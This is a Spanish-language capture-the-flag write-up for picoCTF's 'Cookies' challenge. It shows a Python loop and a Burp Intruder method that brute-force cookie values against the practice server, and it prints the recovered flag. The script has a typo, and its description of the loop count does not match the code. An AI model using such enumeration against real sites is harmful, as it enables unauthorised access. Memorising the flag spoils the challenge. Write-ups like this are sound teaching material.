## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
## Solución

#### Forma 1

usando el siguente codigo usamos la cookie de la pagina y generamos 30 cookies hasta que nos dira la bandera con un ciclo for de python.

```python
mport requests
import re

url = "http://mercury.picoctf.net:29649/"
for i in range(20):
        cookie = {'name':'{}'.format(i)}
        r = requests.get(url, cookies=cookie)
        if 'pico' in r.text:
                flag = re.findall('picoCTF{.*?}',r.text)[0]
                print(flag)
```

lo que tuvimos de resultado.

```
┌──(diego㉿Maquina-deGuerra)-[~]
└─$ python3 hack.py 
^CException ignored in: <finalize object at 0x7fb436080f00; dead>
Traceback (most recent call last):
  File "/usr/lib/python3.13/weakref.py", line 590, in __call__
    return info.func(*info.args, **(info.kwargs or {}))
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 1176, in _close_pool_connections
    conn.close()
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 322, in close
    super().close()
  File "/usr/lib/python3.13/http/client.py", line 1022, in close
    sock.close()   # close it manually... there may be other refs
  File "/usr/lib/python3.13/socket.py", line 505, in close
    self._real_close()
  File "/usr/lib/python3.13/socket.py", line 499, in _real_close
    _ss.close(self)
KeyboardInterrupt: 
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

```

#### Forma 2
usamos la herramienta burp y hacemos un proxy en la pagina web,lo interceptamos y recargamos la pagina para que nos muetsre un metodo GET
![[Pasted image 20250923233822.png]]
y al seleccionarlo lo mandamos al intruder para hacer un ataque con el nombre de la cookie.
![[Pasted image 20250923234029.png]]
revisamos los resultados y en la respuesta usamos el filtrador de abajo con la palabra "picoCTF{}" 
y asi tambien se puede encontrar

## Referencias
python requests: [https://www.w3schools.com/python/module_requests.asp](https://www.w3schools.com/python/module_requests.asp "https://www.w3schools.com/python/module_requests.asp")
curl --> para cargar datos o enviar datos a una pagina web